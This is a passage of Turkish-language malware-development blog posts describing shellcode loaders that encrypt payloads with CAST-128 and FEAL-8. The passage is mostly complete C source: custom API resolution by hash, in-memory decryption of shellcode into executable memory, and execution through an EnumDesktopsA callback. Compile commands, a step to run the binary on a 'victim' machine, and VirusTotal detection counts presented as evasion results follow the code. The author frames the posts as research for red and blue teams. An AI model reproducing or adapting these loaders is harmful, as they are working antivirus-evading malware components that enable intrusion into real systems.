PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
PIMAGE_NT_HEADERS ntHeaders =
(PIMAGE_NT_HEADERS)((BYTE*)hModule + dosHeader->e_lfanew);
PIMAGE_EXPORT_DIRECTORY exportDirectory =
(PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule +
ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
VirtualAddress);

DWORD* addressOfFunctions = (DWORD*)((BYTE*)hModule +
exportDirectory->AddressOfFunctions);
WORD* addressOfNameOrdinals = (WORD*)((BYTE*)hModule +
exportDirectory->AddressOfNameOrdinals);
DWORD* addressOfNames = (DWORD*)((BYTE*)hModule +
exportDirectory->AddressOfNames);

for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
if (strcmp(lpProcName, (const char*)hModule + addressOfNames[i]) == 0) {
return (FARPROC)((BYTE*)hModule + addressOfFunctions
[addressOfNameOrdinals[i]]);
}
}
return NULL;
}

uint32_t key[4] = {0x01234567, 0x89abcdef, 0xfedcba98, 0x76543210};

// CAST-128 round functions (simplified for demonstration)
void f1(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib) & 0xFFFF); // ensure no overflow
*d = (*d + f) & 0xFFFFFFFF;
}

void f2(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia + Ib + 1) & 0xFFFF); // avoid division by zero
*d = (*d ^ f) & 0xFFFFFFFF;
}

void f3(uint32_t *d, uint32_t k) {
uint32_t I = *d ^ k;
uint32_t Ia = (I >> 16) & 0xFFFF;
uint32_t Ib = I & 0xFFFF;
uint32_t f = ((Ia - Ib) & 0xFFFF); // ensure no overflow
*d = (*d ^ f) & 0xFFFFFFFF;
}

// key schedule for CAST-128
void cast_key_schedule(uint32_t* key, uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < ROUNDS; i++) {
subkeys[i][0] = key[0];
subkeys[i][1] = key[1];
subkeys[i][2] = key[2];
subkeys[i][3] = key[3];
}
}

// CAST-128 encryption
void cast_encrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];
for (int i = 0; i < ROUNDS; i++) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

// CAST-128 decryption
void cast_decrypt(uint32_t* block, uint32_t subkeys[ROUNDS][4]) {
uint32_t left = block[0];
uint32_t right = block[1];
for (int i = ROUNDS - 1; i >= 0; i--) {
uint32_t temp = right;
switch (i % 3) {
case 0:
f1(&right, subkeys[i][0]);
break;
case 1:
f2(&right, subkeys[i][1]);
break;
case 2:
f3(&right, subkeys[i][2]);
break;
}
right ^= left;
left = temp;
}
block[0] = right;
block[1] = left;
}

void cast_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint32_t subkeys[ROUNDS][4]) {
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
	cast_encrypt((uint32_t*)(shellcode + i * BLOCK_SIZE), subkeys);
}
}

DWORD calcMyHash(char* data) {
DWORD hash = 0x23;
for (int i = 0; i < strlen(data); i++) {
	hash += data[i] + (hash << 1);
}
return hash;
}

static LPVOID getAPIAddr(HMODULE h, DWORD myHash) {
PIMAGE_DOS_HEADER img_dos_header = (PIMAGE_DOS_HEADER)h;
PIMAGE_NT_HEADERS img_nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)h +
img_dos_header->e_lfanew);
PIMAGE_EXPORT_DIRECTORY img_edt = (PIMAGE_EXPORT_DIRECTORY)(
(LPBYTE)h + img_nt_header->OptionalHeader.
DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
PDWORD fAddr = (PDWORD)((LPBYTE)h + img_edt->AddressOfFunctions);
PDWORD fNames = (PDWORD)((LPBYTE)h + img_edt->AddressOfNames);
PWORD fOrd = (PWORD)((LPBYTE)h + img_edt->AddressOfNameOrdinals);

for (DWORD i = 0; i < img_edt->AddressOfFunctions; i++) {
LPSTR pFuncName = (LPSTR)((LPBYTE)h + fNames[i]);
if (calcMyHash(pFuncName) == myHash) {
// printf("successfully found! %s - %d\n", pFuncName, myHash);
return (LPVOID)((LPBYTE)h + fAddr[fOrd[i]]);
    }
}
return nullptr;
}

void cast_decrypt_and_execute_shellcode(unsigned char* shellcode, int
shellcode_len, uint32_t subkeys[ROUNDS][4]) {
LPVOID mem_block = NULL;
// decrypt function string
d((char*)cva, sizeof(cva), secretKey, sizeof(secretKey));
// allocate memory buffer for payload
d((char*)kdll, sizeof(kdll), secretKey, sizeof(secretKey));

wchar_t wtext[20];
mbstowcs(wtext, kdll, strlen(kdll)+1); //plus null
LPWSTR k_dll = wtext;

// HMODULE kernel = GetModuleHandle((LPCSTR)kdll);
HMODULE kernel = myGM(k_dll);
// pva = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress
// (kernel, (LPCSTR)cva);
pva = (LPVOID(WINAPI *)(LPVOID, SIZE_T, DWORD, DWORD))myGPA(kernel,
(LPCSTR)cva);

// allocate a single block for execution
mem_block = pva(NULL, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
if (mem_block == NULL) {
printf("memory allocation failed\n");
exit(1);
}
// decrypt the entire shellcode into the allocated memory
for (int i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
uint32_t decrypted_block[2];
memcpy(decrypted_block, shellcode + i * BLOCK_SIZE, BLOCK_SIZE);
cast_decrypt(decrypted_block, subkeys);
memcpy((char *)mem_block + i * BLOCK_SIZE, decrypted_block, BLOCK_SIZE);
}

d((char*)udll, sizeof(udll), secretKey, sizeof(secretKey));
HMODULE mod = LoadLibrary((LPCSTR)udll);
LPVOID addr = getAPIAddr(mod, 121801766);
// printf("0x%p\n", addr);
EnumDesktopsA_t myEnumDesktopsA = (EnumDesktopsA_t)addr;

// execute the shellcode using EnumDesktopsA
myEnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem_block,
(LPARAM)NULL);
}

int main() {
unsigned char padded[] = "\x92\x15\x7e\x1b\x46\x4d\xff\xff"
"\x7d\x55\x52\x41\x61\xcc\x51\x41\x52\x73\x83\x33\x2f\x47"
"\xd2\x65\x4d\x72\xd9\x32\xdd\x92\x8b\x52\x30\x50\x76\xc3"
"\xe3\xb6\x3e\x48\x6f\x80\xe7\x74\xca\x8c\xb7\x4a\x89\xcf"
"\xf1\x65\x42\x9b\xc0\xac\x5a\xe1\x3d\xc3\x26\x8d\x41\xc1"
"\x46\xf4\xac\x53\x3c\x8f\xed\x52\x10\x26\x1e\x76\x05\x3b"
"\x20\x3e\x00\x11\x02\xc3\x0f\x05\x3e\x8b\x13\x71\x86\xc0"
"\x85\x91\x85\xc0\xc1\x50\x76\x8a\x32\xda\x3e\x8b\x3e\x91"
"\x1e\x0d\xf6\x65\x20\x49\x8e\x91\x29\x62\xf9\x95\xc9\x3e"
"\x8b\x52\xe3\xc5\x51\x22\xd6\x4d\x6b\x09\x09\xf0\x50\x32"
"\x41\xc1\x55\x4b\xa1\x74\x68\x80\xe0\x75\xf1\x72\x45\x46"
"\x75\xb8\x08\x45\x93\xd8\x30\x5d\x6f\x63\x44\x8b\xb9\x22"
"\x77\x40\x76\xc8\x3e\x41\x3f\x54\x09\x22\x2d\x60\x40\x1c"
"\xdb\x68\xd5\xb6\xb6\x1a\x04\x88\xbd\x8f\x88\x1f\x40\xa3"
"\x58\x5e\x70\xc9\x03\x02\xde\x9d\x41\x5a\x19\x2f\x13\xc0"
"\xee\xa8\xff\xe0\x7b\xc0\xd2\x48\xf9\xce\x8b\x12\xd9\x7d"
"\xb6\x38\x65\x8d\x49\xc7\x01\x27\x48\x8d\x11\x1d\x48\x8d"
"\x66\xfb\x4c\x8d\x16\x1b\x4c\x8d\xf3\xa0\x30\xc9\x7a\x8a"
"\x31\xc9\xf9\x77\x45\x55\x3e\x46\xff\xd5\x56\x36\xa7\x8c"
"\x88\x2d\xba\xa6\x7c\xde\x19\x3b\x80\x97\x83\xc4\x18\x6a"
"\xfd\x9c\x1e\xc3\xfb\xe0\x68\xd9\xcb\x2d\x36\xff\x6f\x6a"
"\x41\x7e\x94\xc4\xa7\xf9\xd5\x4d\x35\x1b\x18\x5a\x71\x2c"
"\x6f\x77\xed\x5f\x63\x63\x0d\x41\x5e\x3d\x00\x00";

uint32_t subkeys[ROUNDS][4];
cast_key_schedule(key, subkeys);
cast_decrypt_and_execute_shellcode(padded, sizeof(padded), subkeys);
return 0;
}
demo 3
Bu versiyonu derleyin:
x86_64-w64-mingw32-g++ -O2 hack3.c -o hack3.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermission

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, bu versiyonu Windows 11 x64 üzerinde çalıştırın:
.\hack3.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, bu versiyon da mükemmel çalıştı!=..=
Bu versiyonu bir AV tarayıcıya yükleyin:
+++++++++++++++++++++++++++++++++++++++++++++++

Sadece Windows Defender ve Secureageapex'in bu dosyayı kötü amaçlı olarak algıladığını not alın:
+++++++++++++++++++++++++++++++++++++++++++++++
https://websec.nl/en/scanner/result/e2b88162-fd20-4f4b-974a-b4182747f0cb
Bu hack3.exe dosyasını VirusTotal’a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/314a02b70ec00b33aaf1882f8c330a8bfe7c951a32d1b103986052313a4fb5b3/detection
Gördüğünüz gibi, yalnızca 75 AV motorundan 8’i dosyamızı kötü amaçlı olarak algılıyor.

CAST-128’in güçlü yönlerine rağmen, birkaç kriptanalitik çalışmaya konu olmuştur:

Diferansiyel Kriptanaliz: Bu yöntem, girdide yapılan belirli değişikliklerin çıktıda tahmin edilebilir değişiklikler oluşturmasını istismar etmeye çalışır. CAST-128’in tasarımı, özellikle doğrusal olmayan S-kutuları ve anahtar bağımlı dönüşümleri, bu saldırıya karşı direnç sağlamaktadır.
Doğrusal Kriptanaliz: Bu teknik, blok şifreleyicinin davranışını tanımlamak için doğrusal yaklaşımlar bulmaya çalışır. CAST-128’in yapısı ve anahtar planlaması, doğrusal yaklaşımları zorlaştırarak bu tür analizlere karşı direnç sağlamaktadır.
Wikipedia, ancak, CAST-128’i bir brute force aramasından daha hızlı kırabilen pratik saldırılar bulunmadığını belirtmektedir; bu da onu güçlü şifreleme gerektiren uygulamalar için güvenilir bir seçenek haline getirmektedir.
Benim uygulamam basitleştirilmiş olmasına rağmen ve CAST-128 günümüzde AES gibi bazı diğer şifreler kadar yaygın olarak kullanılmasa da, özellikle geriye dönük uyumluluk veya belirli güvenlik gereksinimlerinin söz konusu olduğu durumlarda sağlam bir şifreleme algoritması olarak kalmaktadır. S-kutularının ve anahtar planlamasının dikkatli tasarımı, bilinen kriptografik saldırılara karşı dayanıklılığını artırmaktadır.
Umarım bu gönderi, kötü amaçlı yazılım araştırmacıları, C/C++ programcıları için faydalı olur, mavi takımların bu ilginç şifreleme tekniği hakkında farkındalık kazanmasını sağlar ve kırmızı takımların cephaneliğine yeni bir silah ekler.
CAST-128 encryption
AV engines evasion for C++ simple malware - part 2: function call obfuscation
AV engines evasion techniques - part 5. Simple C++ example.
Malware AV/VM evasion - part 15: WinAPI GetModuleHandle implementation. Simple
C++ example.
Malware AV/VM evasion - part 16: WinAPI GetProcAddress implementation. Simple
C++ example.
Malware and cryptography 1
Github’taki kaynak kod

95. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 4 (32): FEAL-8 algoritması ile payload şifreleme. Basit C örneği.

﷽

+++++++++++++++++++++++++++++++++++++++++++++++
Bu gönderi, kötü amaçlı yazılım geliştirmede FEAL-8 blok şifreleme algoritmasının kullanımına ilişkin kendi araştırmamın sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bunu payload'u şifrelemek/şifresini çözmek için uygularsak ne olacağını kontrol etmeye karar verdim.
FEAL


Akihiro Shimizu ve Shoji Miyaguchi, bu algoritmayı NTT Japonya'da geliştirdi. 64 bitlik bir blok ve anahtar kullanılır. Amaç, DES'e benzer ancak daha güçlü bir tur fonksiyonuna sahip bir algoritma oluşturmaktı. Algoritma, daha az tur ile daha hızlı çalışabilir. Ne yazık ki, gerçeklik tasarım hedefleriyle örtüşmedi.
Şifreleme prosedürü, 64 bitlik bir açık metin parçası ile başlar. Öncelikle, veri bloğu 64 bitlik bir anahtar kullanılarak XOR işlemine tabi tutulur. Veri bloğu daha sonra sol ve sağ yarılara bölünür. Sol yarı, sağ yarı ile birleştirilerek yeni bir sağ yarı oluşturulur. Sol ve yeni sağ yarılar, n turdan geçer (başlangıçta dört). Her turda, sağ yarı 16 bitlik anahtar materyali ile (f fonksiyonu aracılığıyla) birleştirilir ve ardından sol yarı ile XOR işlemine tabi tutularak yeni sağ yarı oluşturulur. Yeni sol yarı, turun başındaki orijinal sağ yarıdan oluşur. n turdan sonra (n. turdan sonra sol ve sağ yarıları değiştirmemeyi unutmayın), sol yarı, sağ yarı ile XOR işlemine tabi tutularak yeni sağ yarı oluşturulur ve ardından 64 bitlik bütün bir veri bloğu oluşturmak için birleştirilir. Algoritma tamamlanmadan önce veri bloğu, başka bir 64 bitlik anahtar materyali ile XOR işlemine tabi tutulur.
pratik örnek
Öncelikle rotl fonksiyonuna ihtiyacımız var:
// rotate left 1 bit
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}
Bu fonksiyon, 32 bitlik işaretsiz bir tamsayı (x) üzerinde sola bit kaydırma işlemi gerçekleştirir. x'in bitlerini belirli sayıda konum (shift) sola kaydırır, sol tarafa taşan bitler ise sağ tarafa geri alınır. Bit kaydırma işlemleri, kriptografik algoritmalarda yaygın olarak kullanılır ve verideki desenleri bulanıklaştırarak şifrelemeye direnç kazandırır.
Bir sonraki fonksiyon F fonksiyonudur:
uint32_t F(u32 x1, u32 x2) {
	return rotl((x1 ^ x2), 2);
}
Bu fonksiyon, FEAL-8 algoritmasının temel karıştırma fonksiyonudur. İki 32 bitlik değeri (x1 ve x2) alır, bunları bit düzeyinde XOR (^) işlemine tabi tutar ve ardından rotl fonksiyonu ile sonucu 2 bit sola kaydırır. Bu işlem, şifreleme sürecinin doğrusal olmayan yapısını artırmaya yardımcı olur.
Sıradaki G fonksiyonudur:
// function G used in FEAL-8
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempLeft = *left;
*left = *right;
*right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;
}
G fonksiyonu, FEAL-8'in her turunda ana dönüşüm fonksiyonudur. Veri bloğunun sol ve sağ yarıları üzerinde çalışır. İşlemler şunlardır:
Sol yarıyı (tempLeft) kaydeder.
Sol yarıyı sağ yarıya eşitler (*left = *right).
Sağ yarıyı, tempLeft, F fonksiyonunun sonucu ve tur anahtarının XOR'u ile günceller.
Bu fonksiyon, FEAL-8’in her turunda anahtar dönüşümlerini gerçekleştirerek veri bloğunda gerekli yayılım (diffusion) ve karmaşıklık (confusion) etkisini sağlar. XOR işlemi ve F fonksiyonu, verinin karıştırılmasına ve şifrelemenin saldırılara karşı dayanıklı hale getirilmesine yardımcı olur.
Anahtar Planlama (Key Schedule) fonksiyonu, ana şifreleme anahtarından (key) bir dizi tur alt anahtarı oluşturur. FEAL-8'in 8 turunun her biri için farklı bir alt anahtar oluşturulur. Her turda, anahtar planlama işlemi, anahtarın her baytı ile turun indeksi (i) ve bayt indeksinin (j) toplamı arasında bir XOR işlemi gerçekleştirir:
// key schedule for FEAL-8
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 8; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}


Sonra,şifreleme mantığı:
// FEAL-8 encryption function
void feal8_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}
Bu fonksiyon, 64 bitlik bir veri bloğu üzerinde FEAL-8 şifrelemesi gerçekleştirir (veri bloğu iki 32 bitlik yarıya bölünür: sol ve sağ). 8 tur boyunca, her turda ilgili tur anahtarı ile G fonksiyonunu uygular.
Şifre çözme mantığı:
// FEAL-8 decryption function
void feal8_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];
// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}
Ve shellcode şifreleme ve şifre çözme mantığı:
// function to encrypt shellcode using FEAL-8
void feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_encrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}

// function to decrypt shellcode using FEAL-8
void feal8_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_decrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes with padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
İlk fonksiyon, verilen shellcode'u (bizim durumumuzda "meow-meow messagebox") FEAL-8 şifreleme ile şifrelemekten sorumludur. Shellcode, 64 bitlik bloklar (8 bayt) halinde işlenir ve tam bloğa uymayan kalan baytlar varsa, bunlar şifrelemeden önce 0x90 (NOP) ile doldurulur.
Son olarak, main fonksiyonu, FEAL-8 kullanarak shellcode'u şifreleme, şifresini çözme ve yürütme işlemlerini gösterir.
Her zamanki gibi meow-meow messagebox payload'u kullandım:
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

Ve şifresi çözülen payload, EnumDesktopsA fonksiyonu kullanılarak çalıştırılır.
Tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* encrypt/decrypt payload via FEAL-8 algorithm
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/09/12/malware-cryptography-32.html
*/

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define ROUNDS 8 // FEAL-8 uses 8 rounds of encryption
#define BLOCK_SIZE 8 // FEAL-8 operates on 64-bit (8-byte) blocks

// subkeys generated from the main key
uint8_t K[ROUNDS][8];

// rotate left 1 bit
uint32_t rotl(uint32_t x, int shift) {
	return (x << shift) | (x >> (32 - shift));
}

// function F used in FEAL-8
uint32_t F(uint32_t x1, uint32_t x2) {
	return rotl((x1 ^ x2), 2);
}

// function G used in FEAL-8
void G(uint32_t* left, uint32_t* right, uint8_t* roundKey) {
uint32_t tempLeft = *left;
*left = *right;
*right = tempLeft ^ F(*left, *right) ^ *(uint32_t*)roundKey;
}

// key schedule for FEAL-8
void key_schedule(uint8_t* key) {
for (int i = 0; i < ROUNDS; i++) {
for (int j = 0; j < 8; j++) {
	K[i][j] = key[j] ^ (i + j);
}
}
}

// FEAL-8 encryption function
void feal8_encrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of encryption
for (int i = 0; i < ROUNDS; i++) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}

// FEAL-8 decryption function
void feal8_decrypt(uint32_t* block, uint8_t* key) {
uint32_t left = block[0], right = block[1];

// perform 8 rounds of decryption in reverse
for (int i = ROUNDS - 1; i >= 0; i--) {
	G(&left, &right, K[i]);
}

// final swapping of left and right
block[0] = right;
block[1] = left;
}

// function to encrypt shellcode using FEAL-8
void feal8_encrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_encrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes by padding with 0x90 (NOP)
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_encrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}


// function to decrypt shellcode using FEAL-8
void feal8_decrypt_shellcode(unsigned char* shellcode, int shellcode_len,
uint8_t* key) {
key_schedule(key); // Generate subkeys
int i;
uint32_t* ptr = (uint32_t*)shellcode;
for (i = 0; i < shellcode_len / BLOCK_SIZE; i++) {
feal8_decrypt(ptr, key);
ptr += 2;
}
// handle remaining bytes with padding
int remaining = shellcode_len % BLOCK_SIZE;
if (remaining != 0) {
unsigned char pad[BLOCK_SIZE] =
{ 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
memcpy(pad, ptr, remaining);
feal8_decrypt((uint32_t*)pad, key);
memcpy(ptr, pad, remaining);
}
}
int main() {
unsigned char my_payload[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
"\x2e\x2e\x5e\x3d\x00";

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (BLOCK_SIZE - my_payload_len % BLOCK_SIZE) %
BLOCK_SIZE;
unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs
memcpy(padded, my_payload, my_payload_len);

printf("original shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

uint8_t key[8] = { 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };

feal8_encrypt_shellcode(padded, pad_len, key);

printf("encrypted shellcode:\n");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

feal8_decrypt_shellcode(padded, pad_len, key);

printf("decrypted shellcode:\n");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// allocate and execute decrypted shellcode
LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

return 0;
}
Bu örnek, FEAL-8 şifreleme algoritmasının payload'u şifrelemek ve şifresini çözmek için nasıl kullanılacağını göstermektedir. Doğruluğu kontrol etmek için eklenen yazdırma mantığı bulunmaktadır.
Demo
Şimdi her şeyi çalışırken görelim. Derleyelim (Linux makinemde):
x86_64-w64-mingw32-gcc -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc

+++++++++++++++++++++++++++++++++++++++++++++++
Ardından, sadece mağdurun makinesinde (benim durumumda Windows 11 x64) çalıştırın:
.\hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel çalıştı!=..=
Shannon entropisini hesaplama:
python3 entropy.py -f hack.exe
+++++++++++++++++++++++++++++++++++++++++++++++
.text bölümündeki payload’umuz.
Şimdi bu hack.exe dosyasını VirusTotal'a yükleyelim:
+++++++++++++++++++++++++++++++++++++++++++++++
https://www.virustotal.com/gui/file/08a7fba2d86f2ca8b9431695f8b530be7ad546e3f7467978bd6ff003b7f9508c/detection

Gördüğünüz gibi, 74 antivirüs motorundan yalnızca 25’i dosyamızı kötü amaçlı olarak tespit etti.
Kriptoanaliz
Tarihsel olarak, dört turlu FEAL olan FEAL-4, seçilmiş açık metin saldırısıyla başarıyla analiz edilip yok edilmiştir. Sean Murphy’nin daha sonraki yaklaşımı, yalnızca 20 seçilmiş açık metin gerektiren bilinen ilk diferansiyel kriptanaliz saldırısıydı.
